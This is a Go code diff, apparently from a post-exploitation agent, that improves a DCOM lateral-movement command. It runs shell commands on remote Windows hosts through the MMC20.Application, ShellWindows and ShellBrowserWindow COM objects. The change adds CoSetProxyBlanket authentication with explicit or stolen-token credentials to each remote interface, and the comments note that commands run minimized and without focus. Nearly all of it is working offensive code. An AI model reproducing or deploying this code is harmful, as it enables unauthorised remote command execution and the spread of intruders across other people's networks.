@@ -46,10 +46,11 @@ var (
 	clsidShellBrowserWd = ole.NewGUID("{C08AFD90-F2A1-11D1-8455-00A0C91F3880}")
 )
 
-// ole32.dll for CoCreateInstanceEx
+// ole32.dll for CoCreateInstanceEx and CoSetProxyBlanket
 var (
-	ole32DCOM              = windows.NewLazySystemDLL("ole32.dll")
-	procCoCreateInstanceEx = ole32DCOM.NewProc("CoCreateInstanceEx")
+	ole32DCOM               = windows.NewLazySystemDLL("ole32.dll")
+	procCoCreateInstanceEx  = ole32DCOM.NewProc("CoCreateInstanceEx")
+	procCoSetProxyBlanket   = ole32DCOM.NewProc("CoSetProxyBlanket")
 )
 
 // RPC authentication constants
@@ -131,6 +132,56 @@ func (c *DcomCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 }
 
+// dcomAuthState holds authentication state for a DCOM session.
+// Used to call CoSetProxyBlanket on each obtained proxy interface.
+type dcomAuthState struct {
+	identity *secWinNTAuthIdentityW
+}
+
+// setProxyBlanket calls CoSetProxyBlanket on an IDispatch to authenticate
+// subsequent method calls on the remote COM proxy.
+func (a *dcomAuthState) setProxyBlanket(disp *ole.IDispatch) error {
+	if a == nil || a.identity == nil {
+		return nil
+	}
+	ret, _, _ := procCoSetProxyBlanket.Call(
+		uintptr(unsafe.Pointer(disp)),
+		rpcCAuthnWinNT,          // dwAuthnSvc
+		rpcCAuthzNone,           // dwAuthzSvc
+		0,                       // pServerPrincName (COLE_DEFAULT_PRINCIPAL)
+		rpcCAuthnLevelConnect,   // dwAuthnLevel
+		rpcCImpLevelImpersonate, // dwImpersonationLevel
+		uintptr(unsafe.Pointer(a.identity)), // pAuthInfo
+		eoacNone,                // dwCapabilities
+	)
+	if ret != 0 {
+		return fmt.Errorf("CoSetProxyBlanket failed: HRESULT 0x%08X", ret)
+	}
+	return nil
+}
+
+// buildAuthState creates a dcomAuthState from credentials.
+func buildAuthState(domain, username, password string) *dcomAuthState {
+	if username == "" || password == "" {
+		return nil
+	}
+	userUTF16, _ := windows.UTF16PtrFromString(username)
+	domainUTF16, _ := windows.UTF16PtrFromString(domain)
+	passwordUTF16, _ := windows.UTF16PtrFromString(password)
+
+	return &dcomAuthState{
+		identity: &secWinNTAuthIdentityW{
+			User:           userUTF16,
+			UserLength:     uint32(len(username)),
+			Domain:         domainUTF16,
+			DomainLength:   uint32(len(domain)),
+			Password:       passwordUTF16,
+			PasswordLength: uint32(len(password)),
+			Flags:          secWinNTAuthIdentityUnic,
+		},
+	}
+}
+
 // resolveCredentials determines which credentials to use for DCOM auth.
 // Priority: explicit params > stored make-token credentials
 func resolveCredentials(args dcomArgs) (domain, username, password string, hasExplicit bool) {
@@ -191,39 +242,29 @@ func dcomExec(args dcomArgs) structs.CommandResult {
 
 // createRemoteCOM creates a COM object on a remote host via CoCreateInstanceEx.
 // If credentials are provided, they are passed via COAUTHINFO in COSERVERINFO.
-func createRemoteCOM(host string, clsid *ole.GUID, domain, username, password string) (*ole.IDispatch, error) {
+// Returns the IDispatch and an auth state for setting proxy blankets on sub-interfaces.
+func createRemoteCOM(host string, clsid *ole.GUID, domain, username, password string) (*ole.IDispatch, *dcomAuthState, error) {
 	hostUTF16, err := windows.UTF16PtrFromString(host)
 	if err != nil {
-		return nil, fmt.Errorf("invalid host: %v", err)
+		return nil, nil, fmt.Errorf("invalid host: %v", err)
 	}
 
 	serverInfo := &coServerInfo{
 		pwszName: hostUTF16,
 	}
 
+	// Build auth state for CoSetProxyBlanket on sub-interfaces
+	authState := buildAuthState(domain, username, password)
+
 	// If credentials are provided, build COAUTHINFO with SEC_WINNT_AUTH_IDENTITY
-	if username != "" && password != "" {
-		userUTF16, _ := windows.UTF16PtrFromString(username)
-		domainUTF16, _ := windows.UTF16PtrFromString(domain)
-		passwordUTF16, _ := windows.UTF16PtrFromString(password)
-
-		authIdentity := &secWinNTAuthIdentityW{
-			User:           userUTF16,
-			UserLength:     uint32(len(username)),
-			Domain:         domainUTF16,
-			DomainLength:   uint32(len(domain)),
-			Password:       passwordUTF16,
-			PasswordLength: uint32(len(password)),
-			Flags:          secWinNTAuthIdentityUnic,
-		}
-
+	if authState != nil {
 		authInfo := &coAuthInfo{
 			dwAuthnSvc:           rpcCAuthnWinNT,
 			dwAuthzSvc:           rpcCAuthzNone,
 			pwszServerPrincName:  nil,
 			dwAuthnLevel:         rpcCAuthnLevelConnect,
 			dwImpersonationLevel: rpcCImpLevelImpersonate,
-			pAuthIdentityData:    uintptr(unsafe.Pointer(authIdentity)),
+			pAuthIdentityData:    uintptr(unsafe.Pointer(authState.identity)),
 			dwCapabilities:       eoacNone,
 		}
 
@@ -244,18 +285,27 @@ func createRemoteCOM(host string, clsid *ole.GUID, domain, username, password st
 	)
 
 	if ret != 0 {
-		return nil, fmt.Errorf("CoCreateInstanceEx failed: HRESULT 0x%08X", ret)
+		return nil, nil, fmt.Errorf("CoCreateInstanceEx failed: HRESULT 0x%08X", ret)
 	}
 	if qi.hr != 0 {
-		return nil, fmt.Errorf("interface query failed: HRESULT 0x%08X", qi.hr)
+		return nil, nil, fmt.Errorf("interface query failed: HRESULT 0x%08X", qi.hr)
 	}
 	if qi.pItf == 0 {
-		return nil, fmt.Errorf("CoCreateInstanceEx returned nil interface")
+		return nil, nil, fmt.Errorf("CoCreateInstanceEx returned nil interface")
 	}
 
 	// Convert raw interface pointer to IDispatch
 	disp := (*ole.IDispatch)(unsafe.Pointer(qi.pItf))
-	return disp, nil
+
+	// Set proxy blanket on the initial interface
+	if authState != nil {
+		if err := authState.setProxyBlanket(disp); err != nil {
+			disp.Release()
+			return nil, nil, fmt.Errorf("failed to set proxy blanket: %v", err)
+		}
+	}
+
+	return disp, authState, nil
 }
 
 // dcomExecMMC20 executes a command via MMC20.Application DCOM object.
@@ -283,7 +333,7 @@ func dcomExecMMC20(args dcomArgs) structs.CommandResult {
 		credInfo = fmt.Sprintf("\n  Auth: %s\\%s (explicit)", domain, username)
 	}
 
-	mmc, err := createRemoteCOM(args.Host, clsidMMC20, domain, username, password)
+	mmc, authState, err := createRemoteCOM(args.Host, clsidMMC20, domain, username, password)
 	if err != nil {
 		hint := ""
 		if !hasCreds {
@@ -308,6 +358,9 @@ func dcomExecMMC20(args dcomArgs) structs.CommandResult {
 	}
 	defer docResult.Clear()
 	doc := docResult.ToIDispatch()
+	if authState != nil {
+		_ = authState.setProxyBlanket(doc)
+	}
 
 	// Get ActiveView property
 	viewResult, err := oleutil.GetProperty(doc, "ActiveView")
@@ -320,6 +373,9 @@ func dcomExecMMC20(args dcomArgs) structs.CommandResult {
 	}
 	defer viewResult.Clear()
 	view := viewResult.ToIDispatch()
+	if authState != nil {
+		_ = authState.setProxyBlanket(view)
+	}
 
 	// ExecuteShellCommand(Command, Directory, Parameters, WindowState)
 	// WindowState "7" = SW_SHOWMINNOACTIVE (minimized, no focus)
@@ -368,7 +424,7 @@ func dcomExecShellWindows(args dcomArgs) structs.CommandResult {
 		credInfo = fmt.Sprintf("\n  Auth: %s\\%s (explicit)", domain, username)
 	}
 
-	shellWin, err := createRemoteCOM(args.Host, clsidShellWindows, domain, username, password)
+	shellWin, authState, err := createRemoteCOM(args.Host, clsidShellWindows, domain, username, password)
 	if err != nil {
 		hint := ""
 		if !hasCreds {
@@ -393,6 +449,9 @@ func dcomExecShellWindows(args dcomArgs) structs.CommandResult {
 	}
 	defer itemResult.Clear()
 	item := itemResult.ToIDispatch()
+	if authState != nil {
+		_ = authState.setProxyBlanket(item)
+	}
 
 	// Get Document
 	docResult, err := oleutil.GetProperty(item, "Document")
@@ -405,6 +464,9 @@ func dcomExecShellWindows(args dcomArgs) structs.CommandResult {
 	}
 	defer docResult.Clear()
 	docDisp := docResult.ToIDispatch()
+	if authState != nil {
+		_ = authState.setProxyBlanket(docDisp)
+	}
 
 	// Get Application (returns Shell.Application)
 	appResult, err := oleutil.GetProperty(docDisp, "Application")
@@ -417,6 +479,9 @@ func dcomExecShellWindows(args dcomArgs) structs.CommandResult {
 	}
 	defer appResult.Clear()
 	app := appResult.ToIDispatch()
+	if authState != nil {
+		_ = authState.setProxyBlanket(app)
+	}
 
 	// ShellExecute(File, vArgs, vDir, vOperation, vShow)
 	dir := args.Dir
@@ -464,7 +529,7 @@ func dcomExecShellBrowser(args dcomArgs) structs.CommandResult {
 		credInfo = fmt.Sprintf("\n  Auth: %s\\%s (explicit)", domain, username)
 	}
 
-	browser, err := createRemoteCOM(args.Host, clsidShellBrowserWd, domain, username, password)
+	browser, authState, err := createRemoteCOM(args.Host, clsidShellBrowserWd, domain, username, password)
 	if err != nil {
 		hint := ""
 		if !hasCreds {
@@ -489,6 +554,9 @@ func dcomExecShellBrowser(args dcomArgs) structs.CommandResult {
 	}
 	defer docResult.Clear()
 	docDisp := docResult.ToIDispatch()
+	if authState != nil {
+		_ = authState.setProxyBlanket(docDisp)
+	}
 
 	// Get Application (returns Shell.Application)
 	appResult, err := oleutil.GetProperty(docDisp, "Application")
@@ -501,6 +569,9 @@ func dcomExecShellBrowser(args dcomArgs) structs.CommandResult {
 	}
 	defer appResult.Clear()
 	app := appResult.ToIDispatch()
+	if authState != nil {
+		_ = authState.setProxyBlanket(app)
+	}
 
 	// ShellExecute(File, vArgs, vDir, vOperation, vShow)
 	dir := args.Dir
